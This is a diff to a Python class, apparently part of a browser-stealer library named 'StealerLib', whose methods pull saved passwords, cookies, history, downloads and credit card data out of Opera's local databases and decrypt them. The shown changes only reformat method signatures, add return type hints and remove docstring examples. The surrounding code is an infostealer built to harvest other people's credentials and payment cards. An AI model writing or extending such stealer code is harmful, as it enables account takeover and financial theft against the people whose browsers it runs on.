@@ -99,7 +99,11 @@ class Opera:
 
         return decrypted_pass
 
-    def _opera_passwords(self, path: str, conv: Optional[bool]=True) -> list:
+    def _opera_passwords(
+        self,
+        path: str,
+        conv: Optional[bool]=True
+    ) -> list[Union[list, BrowserTypes.Login]]:
         """Retrieves the site url, username and password from the passed Opera browser by connecting to its database file -
            and decrypting the passwords using the encryption key
 
@@ -110,10 +114,6 @@ class Opera:
 
         Returns:
             list: list of (site_url, username, password) lists (derived from BrowserTypes conv()) 
-
-        Example:
-            opera = Opera()
-            opera._opera_passwords()
         """
 
         login_db = f'{path}\\Login Data'
@@ -143,7 +143,11 @@ class Opera:
 
         return self.opera_passwords
 
-    def _opera_cookies(self, path: str, conv: Optional[bool]=True) -> list:
+    def _opera_cookies(
+        self,
+        path: str,
+        conv: Optional[bool]=True
+    ) -> list[Union[list, BrowserTypes.Cookie]]:
         """Retrieves the site host, cookie name, value and various other information from the passed Opera browser -
            by connecting to its database file and decrypting the cookies using the derived encryption key (from path)
 
@@ -154,10 +158,6 @@ class Opera:
 
         Returns:
             list: list of (host, name, path, value, expires?, expire_date) lists (derived from BrowserTypes conv()) 
-
-        Example:
-            opera = Opera()
-            opera._opera_cookies()
         """
 
         cookies_db = f'{path}\\Network\\Cookies'
@@ -190,7 +190,11 @@ class Opera:
 
         return self.opera_cookies
 
-    def _opera_history(self, path: str, conv: Optional[bool]=True) -> list:
+    def _opera_history(
+        self,
+        path: str,
+        conv: Optional[bool]=True
+    ) -> list[Union[list, BrowserTypes.Site]]:
         """Retrieves the site url, tab title and timestamp (when visited) for each site in the users history from the passed Opera browser -
            by connecting to its database file and parsing the needed data
 
@@ -201,10 +205,6 @@ class Opera:
 
         Returns:
             list: list of (site_url, title, timestamp) lists (derived from BrowserTypes conv()) 
-
-        Example:
-            opera = Opera()
-            opera._opera_history()
         """
 
         history_db = f'{path}\\History'
@@ -233,7 +233,11 @@ class Opera:
 
         return self.opera_history
 
-    def _opera_downloads(self, path: str, conv: Optional[bool]=True) -> list:
+    def _opera_downloads(
+        self,
+        path: str,
+        conv: Optional[bool]=True
+    ) -> list[Union[list, BrowserTypes.Download]]:
         """Retrieves the site url and the target path (where the file was saved locally) for each site in the users downloads from the passed Opera browser -
            by connecting to its database file and parsing the needed data
 
@@ -243,11 +247,7 @@ class Opera:
             conv (bool): Boolean whether to append the data as a converted list of values or a StealerLib Object
 
         Returns:
-            list: list of (tab_url, local_path) lists (derived from BrowserTypes conv()) 
-
-        Example:
-            opera = Opera()
-            opera._opera_downloads()
+            list: list of (tab_url, local_path) lists (derived from BrowserTypes conv())
         """
 
         downloads_db = f'{path}\\History'
@@ -274,7 +274,11 @@ class Opera:
 
         return self.opera_downloads
 
-    def _opera_credit_cards(self, path: str, conv: Optional[bool]=True) -> list:
+    def _opera_credit_cards(
+        self,
+        path: str,
+        conv: Optional[bool]=True
+    ) -> list[Union[list, BrowserTypes.Card]]:
         """Retrieves the card number and its related information for each bank card in the users saved cards from the passed Opera browser -
            by connecting to its database file and parsing the needed data
 
@@ -285,10 +289,6 @@ class Opera:
 
         Returns:
             list: list of (name, month, year, number, date_modified) lists (derived from BrowserTypes conv()) 
-
-        Example:
-            opera = Opera()
-            opera._opera_credit_cards()
         """
 
         cards_db = f'{path}\\Web Data'
